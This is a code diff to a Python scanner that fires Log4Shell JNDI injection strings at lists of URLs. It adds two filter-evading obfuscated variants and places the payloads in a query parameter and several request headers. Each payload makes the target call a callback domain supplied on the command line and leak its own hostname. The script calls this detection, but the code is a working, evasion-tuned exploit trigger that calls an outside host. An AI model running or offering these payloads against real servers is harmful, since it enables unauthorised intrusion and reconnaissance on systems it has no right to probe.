@@ -1,13 +1,16 @@
 from sys import argv
 from requests import get
 from urllib3 import disable_warnings
+import urllib.parse
 from concurrent.futures import ThreadPoolExecutor
 
 def sendDetectionRequest(url, urlId):
     try:
-        payload = '${jndi:ldap://' + str(urlId) + '.' + argv[2] + '/a}'
-        params = {'id':payload}
-        headers = {'User-Agent':payload, 'Referer':payload}
+        payload1 = '${jndi:ldap://' + str(urlId) + '.${hostName}.' + argv[2] + '/a}'
+        payload2 = '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://' + str(urlId) + '.${hostName}.' + argv[2] + '}'
+        payload3 = '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://' + str(urlId) + '.${hostName}.' + argv[2] + '}'
+        params = {'x':payload1}
+        headers = {'User-Agent':payload2, 'Referer':payload3, 'X-Forwarded-For':payload3, 'Authentication':payload3}
         url = url.strip()
         print('[{}] Testing {}'.format(urlId, url))
         get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
